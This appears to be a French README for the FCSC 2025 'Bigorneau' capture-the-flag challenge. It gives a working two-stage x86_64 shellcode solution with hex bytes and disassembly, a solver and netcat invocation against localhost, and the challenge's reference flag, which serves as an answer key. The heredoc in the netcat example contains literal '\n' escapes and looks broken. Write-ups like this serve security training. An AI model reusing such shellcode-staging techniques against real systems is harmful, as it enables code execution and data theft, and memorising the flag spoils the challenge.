# FCSC 2025 — Bigorneau (pwn x86_64)

Ce dépôt regroupe les fichiers du challenge **Bigorneau** (FCSC 2025) et une description reproductible de la résolution.

## Fichiers fournis

- `bigorneau` : exécutable qui charge un blob binaire (shellcode) depuis un fichier puis l’exécute (`-z execstack`).
- `bigorneau.c` : source C du lanceur.
- `bigorneau.py` : wrapper du challenge (lit une chaîne hex, applique la contrainte et lance `./bigorneau`).
- `solve.py` : solveur tout-en-un générant le payload et envoyant le flag sur stdout.
- `docs/` : énoncé PDF et flag de référence (`fcsc_pwn_bigorneau.txt`).

## Pré-requis

- Docker + Docker Compose (exécution locale via Hackropole)
- Python 3 (interaction / génération de payload)
- Outils utiles : `objdump`, `readelf`, `gdb`, `pwntools` (optionnel)

## Contrainte du challenge

- Entrée attendue : chaîne hexadécimale → shellcode x86_64 (max 128 octets).
- Restriction majeure : `len(set(shellcode)) <= 6` (au plus **6 valeurs d’octets distinctes** dans la charge utile que tu tapes).
- Le wrapper (`bigorneau.py`) remet tous les registres à zéro avant d’exécuter le shellcode.

## Payload final

- **Stage 0** (8 octets, 6 valeurs distinctes), hex : `545eb2540f0554c3`  
  Rôle : lit `0x54` octets depuis stdin vers la pile, puis pivote l’exécution dessus.
  ```
  54                push rsp
  5e                pop rsi          ; rsi = rsp (buffer)
  b2 54             mov dl, 0x54     ; longueur lue
  0f 05             syscall          ; read(0, rsi, 0x54)
  54                push rsp
  c3                ret              ; jump stage 1
  ```
- **Stage 1** : shellcode classique `open("/flag", 0)` → `read` → `write`, généré avec pwntools et padded à 0x54 octets (voir `solve.py`).
  Il écrit uniquement le nombre d’octets réellement lus (pas de “bruit” binaire après le flag).

Astuce d’envoi : ne pas enchaîner immédiatement le stage 1 après la ligne hex (sinon `input()` côté challenge peut tenter de décoder des octets binaires). Le solveur attend brièvement avant d’envoyer le stage 1 brut.

## Solveur (`solve.py`)

- Local (lance `python3 bigorneau.py`) :
  ```bash
  # démarrer d’abord le conteneur : docker compose up
  python3 solve.py --host localhost --port 4000 -v
  ```
- Distant : `--host/--port` (ex. docker : `localhost 4000`, ou la cible FCSC) :
  ```bash
  python3 solve.py --host localhost --port 4000 -v
  ```
- Options : `--flag-path` (chemin du flag pour les tests locaux quand le service lit /flag), `-v/--verbose` (affiche tailles / hex du payload), `-w/--wait` (délai avant envoi du stage 1).

Le script génère automatiquement le stage 1, envoie le stage 0 en hex, attend un court instant puis stream le stage 1 binaire. Il extrait et affiche directement le flag (`FCSC{...}`) s’il est présent dans la sortie.

### Envoi manuel via netcat
Si tu veux tester sans le solveur :
```bash
( printf '545eb2540f0554c3\n'; \
  python3 - <<'PY'\nfrom solve import build_stage1\nimport sys\nsys.stdout.buffer.write(build_stage1('/flag', stage0_len=0x54))\nPY\n) | nc localhost 4000
```
La première ligne envoie le stage0 hex, puis le stage1 binaire est lu par le stage0 (syscall read) et exécuté.

## Flag

Référence (fichier `docs/fcsc_pwn_bigorneau.txt`) :

`FCSC{619c629f9dd846fe8f1db9f23693707b7a334ab7da1507dc904b9d5c3fc2a15c}`
